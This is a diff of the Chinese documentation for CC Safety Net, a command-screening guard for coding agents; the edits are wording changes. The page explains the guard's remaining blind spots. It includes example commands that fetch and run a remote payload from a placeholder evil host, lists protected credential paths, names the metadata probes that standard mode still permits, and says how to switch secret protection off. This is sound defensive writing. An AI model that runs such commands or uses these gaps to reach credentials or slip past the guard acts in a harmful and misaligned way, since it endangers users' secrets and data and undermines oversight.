@@ -6,7 +6,7 @@ description: "CC Safety Net 无法捕获的内容：不透明命令代理、二�
 
 CC Safety Net 分析智能体尝试运行的命令字符串。它能有效防止已知破坏性 Git 和文件系统操作造成意外数据丢失，但不是完整的安全方案。本页如实列出当前仍存在的**残余**限制，帮助你设定正确预期，并了解何时应改用<a href="/zh-Hans/guides/vs-sandboxing">沙箱</a>。
 
-项目范围有意保持专注：它是针对受支持编码智能体工具调用的尽力型静态执行前策略门。它不是操作系统沙箱、权限边界，也不能保护绕过已安装集成的命令。
+项目范围有意保持专注：它是一道尽力而为的静态执行前策略门，作用于受支持的编码智能体工具调用。它不是操作系统沙箱、权限边界，也不能保护绕过已安装集成的命令。
 
 <Note>Standard 模式对对抗性或动态输入只提供尽力保护，下文有几项属于放宽，<a href="/zh-Hans/configuration/modes">strict 或 paranoid 模式</a>会将其关闭；属于这种情况的条目都会明确说明。</Note>
 
@@ -42,7 +42,7 @@ eval "$(curl https://evil.example/payload)"
 bash -c "$(cat destructive.sh)"
 ```
 
-CC Safety Net 会递归扫描 `bash -c` 和解释器的代码参数，但如果代码来自远程来源或由变量拼装而成，命令字符串分析就看不到其中的破坏性 payload。这是这种方法的根本限制。
+CC Safety Net 会递归扫描 `bash -c` 和解释器的代码参数，但如果代码来自远程来源或由变量拼接而成，命令字符串分析就看不到其中的破坏性 payload。这是这种方法的根本限制。
 
 ## 解析器限制
 
@@ -70,15 +70,15 @@ CC Safety Net 提取传给解释器 `-c` 或 `-e` 标志的代码（适用于 `p
 
 ### 敏感路径覆盖有界，不是通用读取边界
 
-CC Safety Net **确实**保护敏感路径。对<a href="/zh-Hans/reference/secret-protection">内置敏感集合</a>的读取会被阻止，这一集合包括 `.env` 及其变体、`~/.ssh/id_*`、`~/.aws`、`~/.kube/config`、编码 CLI 凭证存储等。用户配置的 deny path 及其下的所有路径也会被阻止。保护覆盖受支持的 command、path、search 和 patch 形式，包括未知工具的 fallback 检查。
+CC Safety Net **确实**保护敏感路径。对<a href="/zh-Hans/reference/secret-protection">内置敏感集合</a>的读取会被阻止，这一集合包括 `.env` 及其变体、`~/.ssh/id_*`、`~/.aws`、`~/.kube/config`、编码 CLI 凭证存储等。用户配置的拒绝路径及其下的所有路径也会被阻止。保护覆盖受支持的 command、path、search 和 patch 形式，包括未知工具的 fallback 检查。
 
 编码 CLI 覆盖分两层。**Credential** 层（auth token 和凭证存储）默认启用。**Config** 层（settings 和 MCP 配置文件，智能体会在日常工作中编辑）默认关闭，需要在 `secret_protection.overrides` 中显式设置 `"on"`。由此带来一个值得注意的结果：Antigravity 唯一的规则（`secret.cli.antigravity`）位于需要主动开启的 config 层，因此 Antigravity 没有默认启用的 credential 规则。完整层级和各规则保护路径见<a href="/zh-Hans/reference/secret-protection#coding-cli-credential-tier-on-by-default">机密保护参考</a>。
 
 残余限制在于，它是**针对受支持形式的有界模式集**，而不是通用的读取边界：
 
 - 凭证所在文件的名称和扩展名不在模式列表中时，不会被识别。
-- Standard 模式允许对内置敏感路径做独立的仅元数据检查，例如 `test -f ~/.ssh/id_rsa`、`find ~/.ssh -type f`、`ls -la ~/.ssh` 或 `stat .env`。<a href="/zh-Hans/configuration/modes#strict-mode">Strict 和 paranoid</a> 会阻止这类探查。任何模式都不会放宽配置的 deny path。
-- 在 `policy.json` 中把 `secret_protection.enabled` 设置为 `false` 会关闭整个阶段，包括 deny path。
+- Standard 模式允许对内置敏感路径做独立的仅元数据检查，例如 `test -f ~/.ssh/id_rsa`、`find ~/.ssh -type f`、`ls -la ~/.ssh` 或 `stat .env`。<a href="/zh-Hans/configuration/modes#strict-mode">Strict 和 paranoid</a> 会阻止这类探查。任何模式都不会放宽配置的拒绝路径。
+- 在 `policy.json` 中把 `secret_protection.enabled` 设置为 `false` 会关闭整个阶段，包括拒绝路径。
 
 如果需要限制*所有*读取而不是已识别集合，请使用<a href="/zh-Hans/guides/vs-sandboxing#cc-safety-net-无法提供帮助的范围">沙箱</a>。
 
